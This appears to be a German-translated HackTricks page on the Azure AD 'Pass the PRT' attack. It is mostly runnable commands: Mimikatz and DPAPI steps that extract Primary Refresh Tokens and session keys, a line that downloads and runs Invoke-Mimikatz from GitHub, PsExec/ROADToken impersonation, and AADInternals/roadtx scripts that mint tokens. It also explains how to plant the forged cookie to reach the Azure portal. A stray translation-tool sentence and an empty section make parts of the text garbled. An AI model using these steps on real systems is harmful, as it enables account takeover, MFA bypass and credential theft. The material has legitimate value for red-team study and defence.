# Az - Pass the PRT

{{#include ../../../banners/hacktricks-training.md}}

## Was ist ein PRT

{{#ref}}
az-primary-refresh-token-prt.md
{{#endref}}

### Überprüfen Sie, ob Sie ein PRT haben
```
Dsregcmd.exe /status
```
Im Abschnitt SSO-Status sollten Sie sehen, dass **`AzureAdPrt`** auf **JA** gesetzt ist.

<figure><img src="../../../images/image (140).png" alt=""><figcaption></figcaption></figure>

Im gleichen Output können Sie auch sehen, ob das **Gerät mit Azure verbunden ist** (im Feld `AzureAdJoined`):

<figure><img src="../../../images/image (135).png" alt=""><figcaption></figcaption></figure>

## PRT-Cookie

Das PRT-Cookie wird tatsächlich **`x-ms-RefreshTokenCredential`** genannt und es ist ein JSON Web Token (JWT). Ein JWT enthält **3 Teile**, den **Header**, **Payload** und **Signature**, die durch einen `.` getrennt und alle url-sicher base64 kodiert sind. Ein typisches PRT-Cookie enthält den folgenden Header und Body:
```json
{
"alg": "HS256",
"ctx": "oYKjPJyCZN92Vtigt/f8YlVYCLoMu383"
}
{
"refresh_token": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAZ18nQkT-eD6Hqt7sf5QY0iWPSssZOto]<cut>VhcDew7XCHAVmCutIod8bae4YFj8o2OOEl6JX-HIC9ofOG-1IOyJegQBPce1WS-ckcO1gIOpKy-m-JY8VN8xY93kmj8GBKiT8IAA",
"is_primary": "true",
"request_nonce": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAPrlbf_TrEVJRMW2Cr7cJvYKDh2XsByis2eCF9iBHNqJJVzYR_boX8VfBpZpeIV078IE4QY0pIBtCcr90eyah5yAA"
}
```
Der aktuelle **Primary Refresh Token (PRT)** ist innerhalb des **`refresh_token`** kapsuliert, das durch einen Schlüssel, der unter der Kontrolle von Azure AD steht, verschlüsselt ist, wodurch sein Inhalt für uns undurchsichtig und nicht entschlüsselbar ist. Das Feld **`is_primary`** zeigt die Kapselung des primären Refresh Tokens innerhalb dieses Tokens an. Um sicherzustellen, dass das Cookie an die spezifische Anmeldesitzung gebunden bleibt, für die es bestimmt war, wird der `request_nonce` von der Seite `logon.microsoftonline.com` übertragen.

### PRT Cookie-Fluss unter Verwendung von TPM

Der **LSASS**-Prozess sendet den **KDF-Kontext** an das TPM, und das TPM verwendet den **Sitzungsschlüssel** (der beim Registrieren des Geräts in AzureAD gesammelt und im TPM gespeichert wurde) und den vorherigen Kontext, um einen **Schlüssel abzuleiten**, und dieser **abgeleitete Schlüssel** wird verwendet, um das **PRT-Cookie (JWT)** zu **signieren**.

Der **KDF-Kontext ist** ein Nonce von AzureAD und dem PRT, das einen **JWT** gemischt mit einem **Kontext** (Zufallsbytes) erstellt.

Daher, selbst wenn der PRT nicht extrahiert werden kann, weil er sich im TPM befindet, ist es möglich, LSASS zu missbrauchen, um **abgeleitete Schlüssel aus neuen Kontexten anzufordern und die generierten Schlüssel zu verwenden, um Cookies zu signieren**.

<figure><img src="../../../images/image (31).png" alt=""><figcaption></figcaption></figure>

## PRT-Missbrauchsszenarien

Als **normaler Benutzer** ist es möglich, **PRT-Nutzung anzufordern**, indem man LSASS nach SSO-Daten fragt.\
Dies kann wie bei **nativem Apps** geschehen, die Tokens vom **Web Account Manager** (Token-Broker) anfordern. WAM leitet die Anfrage an **LSASS** weiter, das Tokens mit einer signierten PRT-Assertion anfordert. Oder es kann mit **browserbasierten (Web-)Flows** geschehen, bei denen ein **PRT-Cookie** als **Header** verwendet wird, um Anfragen an die Azure AS-Anmeldeseiten zu authentifizieren.

Als **SYSTEM** könnten Sie den PRT **stehlen, wenn er nicht durch TPM geschützt ist** oder **mit PRT-Schlüsseln in LSASS interagieren**, indem Sie Krypto-APIs verwenden.

## Pass-the-PRT-Angriff Beispiele

### Angriff - ROADtoken

Für weitere Informationen zu dieser Methode [**prüfen Sie diesen Beitrag**](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/). ROADtoken wird **`BrowserCore.exe`** aus dem richtigen Verzeichnis ausführen und es verwenden, um ein **PRT-Cookie zu erhalten**. Dieses Cookie kann dann mit ROADtools verwendet werden, um sich zu authentifizieren und **einen persistenten Refresh-Token zu erhalten**.

Um ein gültiges PRT-Cookie zu generieren, benötigen Sie zunächst ein Nonce.\
Sie können dies mit:
```bash
$TenantId = "19a03645-a17b-129e-a8eb-109ea7644bed"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
"URI"     = $URL
"Method"  = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
AwABAAAAAAACAOz_BAD0_8vU8dH9Bb0ciqF_haudN2OkDdyluIE2zHStmEQdUVbiSUaQi_EdsWfi1 9-EKrlyme4TaOHIBG24v-FBV96nHNMgAA
```
Oder mit [**roadrecon**](https://github.com/dirkjanm/ROADtools):
```bash
roadrecon auth prt-init
```
Dann können Sie [**roadtoken**](https://github.com/dirkjanm/ROADtoken) verwenden, um ein neues PRT zu erhalten (führen Sie das Tool aus einem Prozess des Benutzers aus, um anzugreifen):
```bash
.\ROADtoken.exe <nonce>
```
Bitte geben Sie den Text an, den Sie übersetzen möchten.
```bash
Invoke-Command - Session $ps_sess -ScriptBlock{C:\Users\Public\PsExec64.exe - accepteula -s "cmd.exe" " /c C:\Users\Public\SessionExecCommand.exe UserToImpersonate C:\Users\Public\ROADToken.exe AwABAAAAAAACAOz_BAD0__kdshsy61GF75SGhs_[...] > C:\Users\Public\PRT.txt"}
```
Dann können Sie das **generierte Cookie** verwenden, um **Tokens** zu **generieren**, um sich mit Azure AD **Graph** oder Microsoft Graph **anzumelden**:
```bash
# Generate
roadrecon auth --prt-cookie <prt_cookie>

# Connect
Connect-AzureAD --AadAccessToken <token> --AccountId <acc_ind>
```
### Angriff - Verwendung von roadrecon

### Angriff - Verwendung von AADInternals und einem geleakten PRT

`Get-AADIntUserPRTToken` **holt das PRT-Token des Benutzers** von dem Azure AD-verbundenen oder Hybrid-verbundenen Computer. Verwendet `BrowserCore.exe`, um das PRT-Token zu erhalten.
```bash
# Get the PRToken
$prtToken = Get-AADIntUserPRTToken

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
```
Oder wenn Sie die Werte von Mimikatz haben, können Sie auch AADInternals verwenden, um ein Token zu generieren:
```bash
# Mimikat "PRT" value
$MimikatzPRT="MC5BWU..."

# Add padding
while($MimikatzPrt.Length % 4) {$MimikatzPrt += "="}

# Decode
$PRT=[text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))

# Mimikatz "Clear key" value
$MimikatzClearKey="37c5ecdfeab49139288d8e7b0732a5c43fac53d3d36ca5629babf4ba5f1562f0"

# Convert to Byte array and B64 encode
$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzClearKey -replace '..', '0x$&,' -split ',' -ne ''))

# Generate PRTToken with Nonce
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce
$prtToken
## You can already use this token ac cookie in the browser

# Get access token from prtToken
$AT = Get-AADIntAccessTokenForAzureCoreManagement -PRTToken $prtToken

# Verify access and connect with Az. You can see account id in mimikatz prt output
Connect-AzAccount -AccessToken $AT -TenantID <tenant-id> -AccountId <acc-id>
```
Gehe zu [https://login.microsoftonline.com](https://login.microsoftonline.com), lösche alle Cookies für login.microsoftonline.com und füge ein neues Cookie hinzu.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
Dann gehen Sie zu [https://portal.azure.com](https://portal.azure.com)

> [!CAUTION]
> Der Rest sollte die Standardwerte sein. Stellen Sie sicher, dass Sie die Seite aktualisieren können und das Cookie nicht verschwindet. Wenn es das tut, haben Sie möglicherweise einen Fehler gemacht und müssen den Prozess erneut durchlaufen. Wenn nicht, sollten Sie in Ordnung sein.

### Angriff - Mimikatz

#### Schritte

1. Das **PRT (Primary Refresh Token) wird aus LSASS** (Local Security Authority Subsystem Service) extrahiert und für die spätere Verwendung gespeichert.
2. Der **Session Key wird als nächstes extrahiert**. Da dieser Schlüssel zunächst ausgegeben und dann vom lokalen Gerät erneut verschlüsselt wird, ist eine Entschlüsselung mit einem DPAPI-Masterkey erforderlich. Detaillierte Informationen zu DPAPI (Data Protection API) finden Sie in diesen Ressourcen: [HackTricks](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html) und für ein Verständnis seiner Anwendung, siehe [Pass-the-cookie attack](az-pass-the-cookie.md).
3. Nach der Entschlüsselung des Session Keys werden der **abgeleitete Schlüssel und der Kontext für das PRT erhalten**. Diese sind entscheidend für die **Erstellung des PRT-Cookies**. Insbesondere wird der abgeleitete Schlüssel verwendet, um das JWT (JSON Web Token) zu signieren, das das Cookie bildet. Eine umfassende Erklärung dieses Prozesses wurde von Dirk-jan bereitgestellt und ist [hier](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/) zugänglich.

> [!CAUTION]
> Beachten Sie, dass, wenn sich das PRT im TPM und nicht in `lsass` befindet, **mimikatz es nicht extrahieren kann**.\
> Es wird jedoch möglich sein, einen **Schlüssel aus einem abgeleiteten Schlüssel aus einem Kontext** aus dem TPM zu erhalten und ihn zu verwenden, um **ein Cookie zu signieren (siehe Option 3).**

Sie finden eine **detaillierte Erklärung des durchgeführten Prozesses**, um diese Details hier zu extrahieren: [**https://dirkjanm.io/digging-further-into-the-primary-refresh-token/**](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)

> [!WARNING]
> Dies wird nach den Korrekturen im August 2021 nicht genau funktionieren, um die PRT-Token anderer Benutzer zu erhalten, da nur der Benutzer sein PRT abrufen kann (ein lokaler Administrator kann nicht auf die PRTs anderer Benutzer zugreifen), aber auf sein eigenes zugreifen kann.

Sie können **mimikatz** verwenden, um das PRT zu extrahieren:
```bash
mimikatz.exe
Privilege::debug
Sekurlsa::cloudap

# Or in powershell
iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
```
(Images from https://blog.netwrix.com/2023/05/13/pass-the-prt-overview)

<figure><img src="../../../images/image (251).png" alt=""><figcaption></figcaption></figure>

**Kopiere** den Teil, der mit **Prt** gekennzeichnet ist, und speichere ihn.\
Extrahiere auch den Sitzungsschlüssel (den **`KeyValue`** des **`ProofOfPossesionKey`**-Feldes), den du unten hervorgehoben sehen kannst. Dieser ist verschlüsselt und wir müssen unsere DPAPI-Masterkeys verwenden, um ihn zu entschlüsseln.

<figure><img src="../../../images/image (182).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Wenn du keine PRT-Daten siehst, könnte es sein, dass du **keine PRTs hast**, weil dein Gerät nicht mit Azure AD verbunden ist, oder es könnte sein, dass du **eine alte Version** von Windows 10 verwendest.

Um den Sitzungsschlüssel zu **entschlüsseln**, musst du deine Berechtigungen auf **SYSTEM** **erhöhen**, um im Kontext des Computers zu arbeiten, damit du den **DPAPI-Masterkey zur Entschlüsselung verwenden kannst**. Du kannst die folgenden Befehle verwenden, um dies zu tun:
```
token::elevate
dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
```
<figure><img src="../../../images/image (183).png" alt=""><figcaption></figcaption></figure>

#### Option 1 - Vollständiges Mimikatz

- Jetzt möchten Sie sowohl den Kontextwert kopieren:

<figure><img src="../../../images/image (210).png" alt=""><figcaption></figcaption></figure>

- Als auch den abgeleiteten Schlüsselwert:

<figure><img src="../../../images/image (150).png" alt=""><figcaption></figcaption></figure>

- Schließlich können Sie all diese Informationen verwenden, um **PRT-Cookies zu generieren**:
```bash
Dpapi::cloudapkd /context:[CONTEXT] /derivedkey:[DerivedKey] /Prt:[PRT]
```
<figure><img src="../../../images/image (282).png" alt=""><figcaption></figcaption></figure>

- Gehe zu [https://login.microsoftonline.com](https://login.microsoftonline.com), lösche alle Cookies für login.microsoftonline.com und gib ein neues Cookie ein.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
- Gehe dann zu [https://portal.azure.com](https://portal.azure.com)

> [!CAUTION]
> Der Rest sollte die Standardwerte sein. Stelle sicher, dass du die Seite aktualisieren kannst und das Cookie nicht verschwindet. Wenn es verschwindet, hast du möglicherweise einen Fehler gemacht und musst den Prozess erneut durchlaufen. Wenn es nicht verschwindet, solltest du in Ordnung sein.

#### Option 2 - roadrecon mit PRT

- Erneuere zuerst das PRT, das in `roadtx.prt` gespeichert wird:
```bash
roadtx prt -a renew --prt <PRT From mimikatz> --prt-sessionkey <clear key from mimikatz>
```
- Jetzt können wir **Tokens anfordern**, indem wir den interaktiven Browser mit `roadtx browserprtauth` verwenden. Wenn wir den Befehl `roadtx describe` verwenden, sehen wir, dass das Zugriffstoken einen MFA-Anspruch enthält, da der PRT, den ich in diesem Fall verwendet habe, ebenfalls einen MFA-Anspruch hatte.
```bash
roadtx browserprtauth
roadtx describe < .roadtools_auth
```
<figure><img src="../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

#### Option 3 - roadrecon mit abgeleiteten Schlüsseln

Mit dem Kontext und dem von mimikatz ausgegebenen abgeleiteten Schlüssel ist es möglich, roadrecon zu verwenden, um ein neues signiertes Cookie zu generieren mit:
```bash
roadrecon auth --prt-cookie <cookie> --prt-context <context> --derives-key <derived key>
```
## Referenzen

- [https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/)
- [https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
- [https://www.youtube.com/watch?v=x609c-MUZ_g](https://www.youtube.com/watch?v=x609c-MUZ_g)

{{#include ../../../banners/hacktricks-training.md}}
